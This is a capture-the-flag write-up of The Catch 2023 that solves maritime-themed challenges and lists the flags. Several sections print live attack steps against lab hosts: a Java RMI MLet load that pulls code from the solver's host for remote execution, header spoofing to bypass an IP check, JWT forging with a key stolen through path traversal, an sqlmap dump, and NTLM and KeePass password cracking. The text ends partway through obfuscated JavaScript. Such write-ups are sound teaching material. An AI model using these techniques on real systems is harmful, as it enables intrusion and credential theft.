# The Catch 2023

by ov49babi4ka

- **Sailor training center**
    - `FLAG{smna-m11d-hhta-ONOs}` - [VPN Access](#vpn-access)
    - `FLAG{WIFI-AHEA-DCAP-TAIN}` - [Treasure map](#treasure-map)
    - `FLAG{ccLH-dsaz-4kFA-P7GC}` - [Captain's coffee](#captains-coffee)
    - `FLAG{ejii-plmQ-Q53C-gMwc}` - [Ship web server](#ship-web-server)
- **Miscellaneous**
    - `FLAG{ytZ6-Pewo-iZZP-Q9qz}` - [Naval chef's recipe](#naval-chefs-recipe)
    - `FLAG{sEYj-80fd-EtkR-0fHv}` - [Arkanoid](#arkanoid)
- **Below deck troubles**
    - `FLAG{YcbS-IAbQ-KHRE-BTNR}` - [Cat code](#cat-code)
    - `FLAG{MN9o-V8Py-mSZV-JkRz}` - [Component replacement](#component-replacement)
    - `FLAG{910P-iUeJ-Wwq1-i8L2}` - [U.S.A](#usa)
    - `FLAG{5B9B-lwPy-OfRS-4uEN}` - [Suspicious traffic](#suspicious-traffic)
- **Troubles on the bridge**
    - `FLAG{pyeB-941A-bhGx-g3RI}` - [Captain’s password](#captains-password)
    - `FLAG{fmIT-QkuR-FFUv-Zx44}` - [Navigation plan](#navigation-plan)
    - `FLAG{DEIE-fiOr-pGV5-8MPc}` - [Keyword of the day](#keyword-of-the-day)
    - `FLAG{lTrG-3oXn-aoZN-Z4qM}` - [Signal flags](#signal-flags)
- **Crew drills**
    - `FLAG{3YAG-2rbj-KWoZ-LwWm}` - [Sonar logs](#sonar-logs)
    - `FLAG{NICE-NAVY-BLUE-CUBE}` - [Regular cube](#regular-cube)
    - `FLAG{krLt-rvbq-abIR-433A}` - [Web protocols](#web-protocols)
    - `FLAG{QOn7-MdEo-9cuH-aP6X}` - [Apha-Zulu quiz](#apha-zulu-quiz)

## Sailor training center

### VPN Access

> Ahoy, deck cadet,
> 
> a lot of ship systems is accessible only via VPN. You have to install and
> configure OpenVPN properly. Configuration file can be downloaded from CTFd's
> link VPN. Your task is to activate VPN and visit the testing page.
> 
> May you have fair winds and following seas!
> 
> Testing page is available at http://vpn-test.cns-jv.tcc.

For the "VPN Access" challenge, I was tasked with setting up a VPN using
OpenVPN. Once the VPN was active, I needed to access a testing page. I used the
following command to download the content:

```sh
curl -v http://vpn-test.cns-jv.tcc
```

Upon executing the command, the flag `FLAG{smna-m11d-hhta-ONOs}` was retrieved.

### Treasure map

> Ahoy, deck cadet,
>
> working with maps and searching for treasures is every sailor's daily
> routine, right? Your task is to examine the map and find any hidden secrets.
>
> May you have fair winds and following seas!
>
> Download the treasure map.

In the challenge, I was given a map and tasked with uncovering hidden secrets.

![Treasure Map](treasure_map.png)

By following the line on the map and noting down the letters along its path, I
got the flag: `FLAG{WIFI-AHEA-DCAP-TAIN}`.

### Captain's coffee

> Ahoy, deck cadet,
>
> your task is to prepare good coffee for captain. As a cadet, you are
> prohibited from going to the captain's cabin, so you will have to solve the
> task remotely. Good news is that the coffee maker in captain's cabin is
> online and can be managed via API.
>
> May you have fair winds and following seas!
>
> Coffee maker API is available at http://coffee-maker.cns-jv.tcc.

Upon visiting the provided coffee maker API link, I received the following output:

```json
{
  "status": "Coffemaker ready",
  "msg": "Visit /docs for documentation"
}
```

Heading to `/docs`, the Swagger documentation provided details on two endpoints. The `GET /coffeeMenu` endpoint returned:

```json
{
  "Menu": [
    {
      "drink_name": "Espresso",
      "drink_id": 456597044
    },
    {
      "drink_name": "Lungo",
      "drink_id": 354005463
    },
    {
      "drink_name": "Capuccino",
      "drink_id": 234357596
    },
    {
      "drink_name": "Naval Espresso with rum",
      "drink_id": 501176144
    }
  ]
}
```

To prepare the captain's preferred drink, "Naval Espresso with rum", I used the
`POST /makeCoffee/` endpoint with the following command:

```sh
curl -H 'Content-Type: application/json' -d '{"drink_id":501176144}' 'http://coffee-maker.cns-jv.tcc/makeCoffee/'
```

The API responded with:

```json
{
  "message": "Your Naval Espresso with rum is ready for pickup",
  "validation_code": "Use this validation code FLAG{ccLH-dsaz-4kFA-P7GC}"
}
```

The flag is `FLAG{ccLH-dsaz-4kFA-P7GC}`.

### Ship web server

> Ahoy, deck cadet,
> 
> there are rumors that on the ship web server is not just the official
> presentation. Your task is to disprove or confirm these rumors.
> 
> May you have fair winds and following seas!
> 
> Ship web server is available at http://www.cns-jv.tcc.

I started by visiting the given ship web server. At the bottom of the page, a
version string in small gray letters was noticed:
`RkxBR3sgICAgLSAgICAtICAgIC0gICAgfQ==`. Decoding it from Base64 gave
`FLAG{    -    -    -    }`, which was not the flag itself.

A hint led me to inspect the certificate of the web server, revealing several
subdomains:
- documentation.cns-jv.tcc
- home.cns-jv.tcc
- pirates.cns-jv.tcc
- structure.cns-jv.tcc

I mapped these domains to `10.99.0.64` in the `/etc/hosts` file and proceeded
to visit each subdomain. Every subdomain had a similar version string. Decoding
these strings from Base64, I obtained parts of the flag:

```
RkxBR3sgICAgLSAgICAtICAgIC0gICAgfQ== -> FLAG{    -    -    -    } from www.cns-jv.tcc
RkxBR3tlamlpLSAgICAtICAgIC0gICAgfQ== -> FLAG{ejii-    -    -    } from home.cns-jv.tcc
RkxBR3sgICAgLXBsbVEtICAgIC0gICAgfQ== -> FLAG{    -plmQ-    -    } from structure.cns-jv.tcc
RkxBR3sgICAgLSAgICAtUTUzQy0gICAgfQ== -> FLAG{    -    -Q53C-    } from pirates.cns-jv.tcc
RkxBR3sgICAgLSAgICAtICAgIC1nTXdjfQ== -> FLAG{    -    -    -gMwc} from documentation.cns-jv.tcc
```

Combining these fragments, the final flag is `FLAG{ejii-plmQ-Q53C-gMwc}`.

## Miscellaneous

### Naval chef's recipe

> Ahoy, officer,
>
> some of the crew started behaving strangely after eating the chef's speciality
> of the day - they apparently have hallucinations, because they are talking
> about sirens wailing, kraken on starboard, and accussed the chef being
> reptilian spy. Paramedics are getting crazy, because the chef refuses to reveal
> what he used to make the food. Your task is to find his secret recipe. It
> should be easy as the chef knows only security by obscurity and he has
> registered domain chef-menu.galley.cns-jv.tcc. May you have fair winds and
> following seas!
>
> The chef's domain is chef-menu.galley.cns-jv.tcc.

Given the chef's domain `chef-menu.galley.cns-jv.tcc`, I used `curl`, as is my
usual approach, to fetch the webpage:

```sh
curl -v 'chef-menu.galley.cns-jv.tcc'
```

The flag `FLAG{ytZ6-Pewo-iZZP-Q9qz}` was in the response. Using `curl` proved
advantageous since the page redirects to the HTTPS version, showing only the
actual menu.

### Arkanoid

> Ahoy, officer,
>
> a new server with a video game is to be placed in the ship's relaxation
> center. Your task is to check whether the server does not contain any
> vulnerabilities.
>
> May you have fair winds and following seas!
>
> The game server has domain name arkanoid.cns-jv.tcc.


Given the domain name `arkanoid.cns-jv.tcc`, my first instinct was to fetch the
webpage using `curl`. Unfortunately, this yielded no results. As the next
logical step, I scanned for open ports using `nmap`, identifying port 8000. The
port revealed a webpage featuring the Arkanoid game, built using JavaScript.

Delving into the game's code, I stumbled upon this snippet:

```js
    if(score == brickRowCount*brickColumnCount) {
        fetch("/score?data="+score)
            .then(response => response.json())
            .then(data => {
                console.log(data);
                alert(data.message);
            }).catch(error => {
                console.error('Error:', error);
            });
   }
```

However, the `/score` entry point merely returned `{"message": "Nice score !"}`,
even when tampered with. Another thing to note was an HTTP header
`X-server: Java/1.8.0_144` which hinted at a potential Java-related
vulnerability.

Even though my initial thoughts were about a java deserialization attack or
leveraging the log4j vulnerability via the `/score` endpoint, I couldn't get
anything conclusive. A more extensive port scan led to the discovery of two
more open ports, both serving Java RMI:

```
60001/tcp open  java-rmi   Java RMI
60002/tcp open  java-rmi   Java RMI
```

Given the Java RMI service, I referred to an article on [Java RMI Exploitation
with
Metasploit](https://www.yeahhub.com/java-rmi-exploitation-metasploit-framework/).
Using Metasploit, I attempted to create a reverse shell but no luck. A deeper
dive into potential vulnerabilities of Java RMI brought me to another resource:
[Pentesting Java
RMI](https://book.hacktricks.xyz/network-services-pentesting/1099-pentesting-java-rmi).

Following it, I ran:

```
java -jar rmg.jar guess arkanoid.cns-jv.tcc 60001
```

and later the `rmg` tool pointed me towards the [Beanshooter tool on
GitHub](https://github.com/qtc-de/beanshooter#mlet). Although I primarily
copy-pasted commands from the guide, this one proved useful:

```sh
java -jar beanshooter.jar mlet load arkanoid.cns-jv.tcc 60001 tonka http://10.200.0.18:4444
```

Without fully grasping the details, I suddenly had the ability to execute
commands on the server. After some unsuccessful file searches, I ran the `env`
command:

```sh
java -jar beanshooter.jar tonka exec arkanoid.cns-jv.tcc 60001 'env'
```

This exposed the flag: `FLAG=FLAG{sEYj-80fd-EtkR-0fHv}`.

## Below deck troubles

### Cat code

> Ahoy, officer,
>
> due to the lack of developers on board, the development of the access code
> generator for the satellite connection was entrusted to the cat of the chief
> officer. Your task is to analyze the cat's creation and find out the code.
>
> May you have fair winds and following seas!
>
> Download the cat code.

The challenge provides two Python scripts within an archive, `meowmeow.py`:

```py
from meow import meow, meowmeow

def meoow():
    meoword = ''
    while meoword != 'kittens':
        meoword = input('Who rules the world? ')
        if meoword in ['humans', 'dogs']:
            print('MEOW MEOW!')
    print(meowmeow(meow(sum([ord(meow) for meow in meoword]))))

if __name__ == '__main__':
    meoow()
```

and `meow.py`:
```py
UNITE = 1
UNITED = 2
meeow = [[80, 81], [-4, 13], [55, 56], [133, 134], [-8, -7, -5], [4, 5],
  [5, 6], [6, 7], [7, 8], [15, -1], [11, 12], [13, 14], [17, 18], [18, 19],
  [15, 21], [22, 23], [26, 27], [44, 45], [48, 49], [31, -29], [50, 51],
  [60, 61], [72, 73], [73, 74], [19, 2, 20]]

def meow(kittens_of_the_world):
    print('meowwww ', end='')
    if kittens_of_the_world < UNITED:
        return kittens_of_the_world
    return meow(kittens_of_the_world - UNITE) + meow(kittens_of_the_world - UNITED)

def meowmeow(meow):
    meeoww = ''
    for meoww in meeow:
        print('meowwww ', end='')
        meeoww = f"{meeoww}{chr(int(''.join(str(meow)[m] for m in meoww)))}"
    return meeoww
```

When I ran the main script, it continuously printed `meowwww` without offering
much clarity. So, I shifted my focus to dissecting the functions and their
underlying logic.

I noticed the code snippet `sum([ord(meow) for meow in meoword])` which
calculates the sum of ASCII values of characters in a given word. For the input
`kittens`, this outputs 770. The next function, `meow`, uses this number to
compute a Fibonacci sequence. However, it does so using recursion, which is
notably inefficient for larger inputs like 770.

To address this inefficiency, I substituted the recursive Fibonacci approach
with a more streamlined iterative method:

```py
def fibonacci(n):
    if n < 2:
        return n
    a, b = 0, 1
    for i in range(1, n):
        c = a + b
        a = b
        b = c
    return b
```

Leveraging this improved function, I quickly computed the Fibonacci sequence
for the value 770, resulting in:
```
37238998302736542981557591720664221323221262823569669806574084338006722578252257702859727311771517744632859284311258604707327062313057129673010063900204812137985
```

With this large number at my disposal, I proceeded to the `meowmeow` function.
It systematically navigates through the number, picking specific index values
and converting them to characters. The underlying logic essentially forms a
string from slices of this sizable number.

I then consolidated the operations into a single main function:

```py
if __name__ == '__main__':
    meoword = 'kittens'
    s = sum([ord(meow) for meow in meoword])
    f = fibonacci(s)
    m = meowmeow(f)
    print(m)
```

Executing this refined script revealed the flag: `FLAG{YcbS-IAbQ-KHRE-BTNR}`.

### Component replacement

> Ahoy, officer,
>
> the ship had to lower its speed because of broken `fuel efficiency enhancer`.
> To order a correct spare part, the chief engineer needs to know exact
> identification code of the spare part. However, he cannot access the web page
> listing all the key components in use. Maybe the problem has to do with
> recently readdressing of the computers in the engine room - the old address
> plan for whole ship was based on range `192.168.96.0/20`. Your task is to
> find out the identification code of the broken component.
>
> May you have fair winds and following seas!
>
> The webpage with spare parts listing is available at
> http://key-parts-list.cns-jv.tcc.

Initially, when I tried to access the webpage directly using curl, it responded
with an error message indicating that my IP address wasn't part of the engine
room's address plan:
```
$ curl -v http://key-parts-list.cns-jv.tcc
You are attempting to access from the IP address 10.200.0.29, which is not assigned to engine room. Access denied.
```
To bypass this IP check, I considered adding an `X-Forwarded-For` header, which
is often used to indicate the original IP address of a client communicating
through an HTTP proxy.
```sh
$ curl -vH 'X-Forwarded-for: 192.168.96.1' http://key-parts-list.cns-jv.tcc
You are attempting to access from the IP address 192.168.96.1, which is not assigned to engine room. Access denied
```
I still encountered an access denial but it confirmed my hypothesis because the
IP address changed in the error message. I was on the right track, but I needed
to scan through the entire given address range to find the exact IP address or
addresses that would grant access.

To achieve this, I used a one-liner script that would iterate over the entire
IP range:
```sh
echo {96..111}.{1..255} | xargs -n1 | xargs -i curl -H 'X-Forwarded-for: 192.168.{}' http://key-parts-list.cns-jv.tcc | tee log
```
When I examined the log file, I found the identification code of the broken
component, `fuel efficiency enhancer`, multiple times. The code was:
```
Fuel efficiency enhancer;FLAG{MN9o-V8Py-mSZV-JkRz};0
```
This repetition in the logs suggested that there were multiple valid IPs within
the `192.168.100.32/27` range that granted access to the server.

### U.S.A.

> Ahoy, officer,
>
> on our last port visit, a new U.S.A. (Universal Ship API) interface was
> installed on the ship. In order to unlock new experimental ship functions,
> the special code has to be entered into ship FLAG (First Layer Application
> Gateway). Your task is to get this FLAG code from U.S.A.
>
> May you have fair winds and following seas!
>
> The U.S.A. is available at http://universal-ship-api.cns-jv.tcc.

I began by querying the provided URL, which informed me that I was interacting
with the:
```json
{"msg":"Naval ship API version 1.0"}
```

To discover more endpoints, I used the `dirb` crawler, revealing `/docs` and
`/api` endpoints. Unfortunately, `/docs` required a Bearer Token
authentication, which I didn't have:
```json
{"detail":"Not authenticated"}
```
On investigating `/api`, it further broke down to two more endpoints
`/api/v1/user` and `/api/v1/admin`.

I tested them both and discovered `/api/v1/admin/file` which returns following
error message:
```json
{"detail":"Method Not Allowed"}
```
This led me to the realization that I should also test other HTTP methods aside
from the `GET`. Therefore, I switched to `ffuf` tool, using the `POST` method,
which brought up `/api/v1/user/signup` and `/api/v1/user/login`.

With these new endpoints, I utilized Python scripts to facilitate the signup
and login process. I successfully registered a user and logged in to obtain an
authentication token:
```python
import requests

def _url(path):
    return 'http://universal-ship-api.cns-jv.tcc' + path

user = 'aasdfalkjasd@test.tcc'
pwd = 'pass'
url = '/api/v1/user/signup'

resp = requests.post(_url(url),
    json = {
        'password': pwd,
        'email': user,
    }
)

def login(user, pwd):
    url = '/api/v1/user/login'
    resp = requests.post(_url(url),
        data = {
            'password': pwd,
            'username': user,
        }
    )
    return resp

resp = login(user, pwd)
data = resp.json()
token = data.get('access_token')
print(f'Authorization: Bearer {token}')
```
Using this token, I could now access the `/docs`. The swagger documented
various endpoints:
```
GET  /api/v1/admin
POST /api/v1/admin/file
PUT  /api/v1/admin/getFlag
GET  /api/v1/user/{user_id}
POST /api/v1/user/signup
POST /api/v1/user/login
POST /api/v1/user/updatepassword
GET  /api/v1/user/cgi-bin
```
one of which seemed promising: `/api/v1/admin/getFlag`.

Upon analyzing the structure of the token, it was evident that it was a JSON Web Token (JWT)
```
eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3NDY0NzI2LCJpYXQiOjE2OTY3NzM1MjYsInN1YiI6IjIiLCJhZG1pbiI6ZmFsc2UsImd1aWQiOiI5Yzk3MDg0MS0zZjIxLTQ3MWMtYTdiMi0yNWYwZTU3ZGYxZDAifQ.MsG_fSwQORU7BpfwCefEwIuLloQx7O5-8H67uRaLxvKxQ3hFvuKSFdNiEKeZXizOEIs6G8IsD4t8rJI02Ufhepk3SChazGAvFwkELsq76WzMrmjUj4PYkAAmlswBpziNtWTBhHWbYhkeqz3gKEMZkL2sGvY-yoNBKOcu7KFZYZMVIzLNg2mlt3VVKSuF19dM50xNYI1-4kh3WecQNiAUyMWU4I2tbtBfHuNsc4mmYfnElISZjNAQPnMkAPjwCXnsPAEaS903oRWuCgoq64QfV6Lh82AO7m3cAhJlbsjwDyUnat5uTJ-wf833fZTEt9NrUKmZv2CCX7zr8ZVRYCwiDlT0i7jWiNOafFJI0F1mKAh6_1pYDy8DanA8RX2adpn8XndmyRU-LHX8jtCqwYIe_2sPjJ5ncVTmyXbyvWdcMY3MiTWIhrroai5gbcPKq2tRuFt-ORyYp0e91zVs2F3Q19tow-mXC9nIqE8atAS64VdWD4sZqVsSYVSYncXDQYyf-6nngNBcg7EtvLJLtwDn6TlWnVOuU3EV6QPw7HDIl8MZkkAr2Wob4S9SeWodwikFd1vs4oLBh-MpxVEDJO8WGfg06PzRXIHXtw5MAtzUB2uzs0o-tfm13eeDSS6MYLoMKK_aCbLhqboEweRiYv9_sTWSAljMq04wZ4H3ANqmVA4
```
It uses `RS384` signing algorithm:
```json
{
  "alg": "RS384",
  "typ": "JWT"
}
```
and payload identifies a user with `guid`, which seemed unique per user.
```json
{
  "type": "access_token",
  "exp": 1697464726,
  "iat": 1696773526,
  "sub": "2",
  "admin": false,
  "guid": "9c970841-3f21-471c-a7b2-25f0e57df1d0"
}
```
Admin's id was conventionally `1`. I tried to change the admin's password using
the available token and succeeded:
```python
url = '/api/v1/user/1'
resp = requests.get(_url(url),
    headers = {
        'Authorization': "Bearer " + token,
    }
)
admin = resp.json()

url = '/api/v1/user/updatepassword'
resp = requests.post(_url(url),
    headers = {
        'Authorization': "Bearer " + token,
    },
    json = {
        'guid': admin['guid'],
        'password': pwd,
    }
)
```
With the admin credentials in hand, I acquired the admin's token:
```python
resp = login(admin['email'], pwd)
data = resp.json()
token = data.get('access_token')
print(f'Authorization: Bearer {token}')
```
Though I was now armed with the admin token, a direct request to
`/api/v1/admin/getFlag` resulted in an error stating:
```json
{"detail":"flag-read key missing from JWT"}
```

Thus, I shifted focus to the `/api/v1/admin/file` endpoint. I was able to
retrieve the contents of `/etc/passwd`. Curious about the directory depth, I
probed with `../etc/passwd`, a path traversal technique often used to explore
the depth of the directory structure. This made me consider that I might be
operating within a container. To verify this hypothesis, I checked for the
existence of the `/.dockerenv` file, which indeed confirmed that the
environment was containerized.

Given that the server was running on `unicorn`, I then accessed
`requirements.txt` to get insights on the dependencies and components of the
application. While I initially struggled to locate specific Python files, I
redirected my attention to `/proc/1/cmdline`, which revealed the main
application's execution path. This led me to the discovery of
`shipapi/main.py`. Diving deeper, this file provided a reference to
`shipapi/appconfig/config.py`.

Within this configuration file, I found the exact locations of both the public
and private RSA keys used for JWT signing:
```python
    JWT_RSA_KEY =  open('shipapi/appconfig/jwtsigning.key').read()
    JWT_RSA_PUB = open('shipapi/appconfig/jwtsigning.pub').read()
```
With these keys, I utilized https://jwt.io to craft a custom JWT that had the
claim:
```json
"flag-read": true
```
Once in possession of this new token, I again accessed the
`/api/v1/admin/getFlag` endpoint, successfully retrieving the flag:
```json
{"Flag":"FLAG{910P-iUeJ-Wwq1-i8L2}"}
```

### Suspicious traffic

> Ahoy, officer,
>
> the chief security officer has told you, he came across a very suspicious
> event in ship's security logs on the occasion of a planned monthly log check.
> The event is related to accessing the secret file secret.db on server on
> cargo deck. Luckily, the ship is equipped with an automatic network traffic
> recorder, which was activated by the suspicious event and provided
> corresponding packet capture. Your task is to confirm that the mentioned file
> has been exfiltrated and to examine its contents.
>
> May you have fair winds and following seas!
>
> Download the pcap.

To begin, I dove into the provided pcap, which contained multiple TCP
connections. While the early notable ones were SMB connections transmitting
`history.db` and `employees.db` repeatedly, they appeared to be red herrings.
Soon after, I noticed an FTP connection transmitting `env.tgz` and `home.tgz`.
The `etc` directory didn't yield any leads, but the `home` directory had a
`.bash_history` file with a command showing encryption using `openssl` for the
file `secret.db`:
```sh
openssl enc -aes-256-cbc -salt -pbkdf2 -in secret.db -out secret.db.enc -k R3alyStr0ngP4ss!
```
Further exploration of the pcap highlighted multiple HTTP requests, some of
which had Basic authorization headers. From these headers and the FTP
connection, two passwords were extracted:
```
james.f0r.HTTP.4648507
james.f0r.FTP.3618995
```

A notable encrypted SMB connection was present in the pcap, suggesting the
encrypted file `secret.db.enc` might have been sent through this stream. To
confirm and decrypt this, I referred to an article
[Decrypting SMB3 Traffic with just a PCAP?](https://medium.com/maverislabs/decrypting-smb3-traffic-with-just-a-pcap-absolutely-maybe-712ed23ff6a2)
that explained the decryption process for SMB3 traffic. Following the steps
outlined, I extracted the required information for a brute force attack using
`hashcat`:
```
ntlm challenge: 78c8f4fdf5927e58
ntproofstr:     8bc34ae8e76fe9b8417a966c2f632eb4
ntlm response:  8bc34ae8e76fe9b8417a966c2f632eb401010000000000003ab4fc1550e2d901b352a9763bdec89a00000000020018004100360037004600320042004100340045003800460032000100180041003600370046003200420041003400450038004600320004000200000003001800610036003700660032006200610034006500380066003200070008003ab4fc1550e2d901060004000200000008003000300000000000000000000000000000002581558b8f3cf059f3661e7cb3af60d9b63a7561b7f48607589fb37e551862b10a0010000000000000000000000000000000000009001e0063006900660073002f0073006d006200730065007200760065007200320000000000
session key:    4292dac3c7a0510f8b26c969e1ef0db9
```
The data extracted was transformed into a `hashcat` compatible format and saved
into a file named `crackme`:
```
JAMES_ADMIN::LOCAL.TCC:78c8f4fdf5927e58:8bc34ae8e76fe9b8417a966c2f632eb4:01010000000000003ab4fc1550e2d901b352a9763bdec89a00000000020018004100360037004600320042004100340045003800460032000100180041003600370046003200420041003400450038004600320004000200000003001800610036003700660032006200610034006500380066003200070008003ab4fc1550e2d901060004000200000008003000300000000000000000000000000000002581558b8f3cf059f3661e7cb3af60d9b63a7561b7f48607589fb37e551862b10a0010000000000000000000000000000000000009001e0063006900660073002f0073006d006200730065007200760065007200320000000000
```
To crack the password, I deployed `hashcat` with a custom mask targeting the
pattern suggested by the previously discovered passwords:
```sh
hashcat crackme -m5600 -a3 'james.f0r.SMB.?d?d?d?d?d?d?d'
```

However, the process was daunting, and I began to question if I was headed in
the right direction. I reached out to EngyCZ, who reassured me that I was
indeed on the right track, thank You! I realized that the username also needed
to fit within the password's pattern. This led me to successfully extract the
password as `james_admin.f0r.SMB.8089078`.

With this password in hand and the script from the article, the random session
key was obtained:
```
session id: 49b136b900000000
random sk:  7a93dee25de4c2141657e7037dddb8f1
```

Armed with the session id and the random session key, I was able to decrypt the
encrypted connection, revealing the `secret.db.enc` file.  Employing the
previously discovered `openssl` command and the encryption password, I
decrypted the file:
```sh
openssl enc -aes-256-cbc -d -salt -pbkdf2 -in secret.db.enc -out secret.db -k 'R3alyStr0ngP4ss!'
```
The decrypted `secret.db` contained a table named `secrets`, holding the flag:
`FLAG{5B9B-lwPy-OfRS-4uEN}`.

## Troubles on the bridge

### Captain’s password

> Ahoy, officer,
>
> our captain has had too much naval espresso and is temporary unfit for duty.
> The chief officer is in command now, but he does not know the captain's
> passwords for key ship systems. Good news is that the captain uses password
> manager and ship chief engineer was able to acquire captain's computer memory
> crash dump. Your task is to acquire password for signalization system.
>
> May you have fair winds and following seas!
>
> Download the database and memory dump.

Upon being presented with the challenge, the first order of business was to
analyze the provided memory dump and see if I could extract any useful data
from it. Given the nature of the task, it seemed plausible that the key might
still be lingering in the memory dump.

Turning to the world of open-source tools, I discovered a Python script
designed for this very purpose, available at
[`keepass-dump-masterkey`](https://github.com/CMEPW/keepass-dump-masterkey).
This tool aims to extract master keys from KeePass databases when provided with
a memory dump.

Executing the script with the provided memory dump:

```sh
python poc.py -d crashdump.dmp
```

I was presented with a set of potential passwords:

```
Possible password: ●)ssword4mypreciousship
Possible password: ●assword4mypreciousship
Possible password: ●:ssword4mypreciousship
Possible password: ●|ssword4mypreciousship
Possible password: ●Wssword4mypreciousship
Possible password: ●5ssword4mypreciousship
Possible password: ●rssword4mypreciousship
```

By taking a closer look, I deduced that `password4mypreciousship` was the
probable passphrase.

Having this information at hand, I then proceeded to use `kpcli`, a
command-line interface to KeePass databases, to open the `captain.kdbx`
database file with the deduced password:

```sh
echo password4mypreciousship | kpcli --kdb=captain.kdbx
```

Exploring the database led me straight to the desired password for the
signalization system:

```
kpcli:/> show -f captain/Inernal\ ship\ systems/Main\ Flag\ System

 Path: /captain/Inernal ship systems/
Title: Main Flag System
Uname: captain
 Pass: FLAG{pyeB-941A-bhGx-g3RI}
  URL:
Notes:
```

### Navigation plan

> Ahoy, officer,
>
> the chief officer was invited to a naval espresso by the captain and now they
> are both unfit for duty. The second officer is very busy and he has asked you
> to find out where are we heading according to the navigation plan.
>
> May you have fair winds and following seas!
>
> The navigation plan webpage is available at
> http://navigation-plan.cns-jv.tcc.

Upon inspecting the web page provided in the challenge, it was clear that
access to the navigation plans was restricted. The initial attempt was to
exploit potential vulnerabilities in the login mechanism by using SQL
Injection, but this route did not yield any results.

I then took a different approach. By crawling the web page using `dirb`, a file
named `system/install.mysql` was discovered. This file details the database
layout for the application. Notably, it contains the table structure for
`users`, `targets`, and `files`:
```sql
SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

CREATE DATABASE IF NOT EXISTS `navigation` DEFAULT CHARACTER SET utf8mb3 COLLATE utf8mb3_czech_ci;
USE `navigation`;

CREATE TABLE `users` (
  `id` smallint(5) UNSIGNED NOT NULL,
  `username` varchar(64) COLLATE utf8mb3_czech_ci NOT NULL,
  `password` varchar(256) NOT NULL,
  `rank` tinyint(1) NOT NULL,
  `active` tinyint(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_czech_ci;

CREATE TABLE `targets` (
  `id` smallint(5) UNSIGNED NOT NULL,
  `id_user` smallint(5) UNSIGNED NOT NULL,
  `name` varchar(128) COLLATE utf8mb3_czech_ci NOT NULL,
  `location` varchar(128) NOT NULL,
  `raw` varchar(512) NOT NULL,
  `status` tinyint(1) NOT NULL,
  `date_added` datetime NOT NULL,
  `finished` tinyint(1) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_czech_ci;

CREATE TABLE `files` (
  `id_file` smallint(5) UNSIGNED NOT NULL,
  `id_user` smallint(5) UNSIGNED NOT NULL,
  `id_target` smallint(5) COLLATE utf8mb3_czech_ci NOT NULL,
  `data` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_czech_ci;

ALTER TABLE `users`
    ADD PRIMARY KEY (`id`);

ALTER TABLE `targets`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `files`
  ADD PRIMARY KEY (`id_file`),
  ADD KEY `id_target` (`id_target`);

ALTER TABLE `targets`
  MODIFY `id` smallint(5) UNSIGNED NOT NULL AUTO_INCREMENT;

ALTER TABLE `files`
  MODIFY `id_file` smallint(5) UNSIGNED NOT NULL AUTO_INCREMENT;
```

By taking closer look to the site, I observed that images were being fetched
with specific parameters in the URL. These parameters were in the format
`image.png?type=data&t=targets&id=5`. This behavior signaled a potential
vulnerability that could be exploited using SQL Injection.

To confirm this suspicion, I utilized `sqlmap` to probe for vulnerabilities.
This effort proved successful. I managed to dump password hashes associated
with user accounts with this command:
```bash
sqlmap -u 'http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=5' --dump -T users -C id,username,password,rank,active
```
Specifically, two hashes were retrieved, associated with the usernames `engineer` and `captain`:
```
15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225:engeneer
7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537:captain
```
I searched the hashes online. The password for the `engineer` account was found
to be `123456789`, but this account was inactive and could not be used to
access the plans. Fortunately, the hash for the `captain` account yielded the
password `$captainamerica$`.

By logging in using the `captain` credentials, access to the navigation plans
was finally granted. The flag was located in the details of "Target 4":
`FLAG{fmIT-QkuR-FFUv-Zx44}`.
 
### Keyword of the day

> Ahoy, officer,
>
> one of deck cadets (remember your early days onboard) had a simple task to
> prepare simple web application to announce keyword of the day. He claimed
> that the task is completed, but he forgot on which port the application is
> running. Unfortunately, he also prepared a lot of fake applications, he
> claims it was necessary for security reasons. Find the keyword of the day, so
> daily routines on ship can continue.
>
> May you have fair winds and following seas!
>
> The webs are running somewhere on server keyword-of-the-day.cns-jv.tcc.

Using `nmap`, I discovered a range of open ports from 60000 to 60500 on the
server.  After manual inspection of a few, each appeared to show a spinner,
which after a while, got replaced by a smiley image. The commonality in all the
pages was an obfuscated javascript:
```js
(
  function (_0x32e32d, _0x22286f) {
    var _0x18b4e5 = _0x4b01,
    _0x132488 = _0x32e32d();
    while (!![]) {
      try {
        var _0xe388e0 = - parseInt(_0x18b4e5(512)) / (7 * - 421 + - 6507 + 61 * 155) * (parseInt(_0x18b4e5(497)) / (1078 + 8079 + - 9155)) + parseInt(_0x18b4e5(503)) / (3860 + 5519 + - 9376) * (parseInt(_0x18b4e5(506)) / ( - 6993 + 1 * - 3028 + 10025)) + - parseInt(_0x18b4e5(529)) / ( - 2023 + 7678 + - 5650) * ( - parseInt(_0x18b4e5(513)) / (261 * 8 + 2849 + - 1 * 4931)) + - parseInt(_0x18b4e5(507)) / ( - 5634 + - 2617 * 1 + - 1 * - 8258) + parseInt(_0x18b4e5(508)) / (8586 + 9741 + 2617 * - 7) + - parseInt(_0x18b4e5(504)) / (10 * 21 + 13 * 382 + 1 * - 5167) * (parseInt(_0x18b4e5(519)) / ( - 729 + 7721 + - 6982)) + - parseInt(_0x18b4e5(502)) / (501 * 14 + 7426 + - 14429) * ( - parseInt(_0x18b4e5(511)) / (86 + - 773 * 3 + 1 * 2245));
        if (_0xe388e0 === _0x22286f) break;
         else _0x132488['push'](_0x132488['shift']());
      } catch (_0x270ab6) {
        _0x132488['push'](_0x132488['shift']());
      }
    }
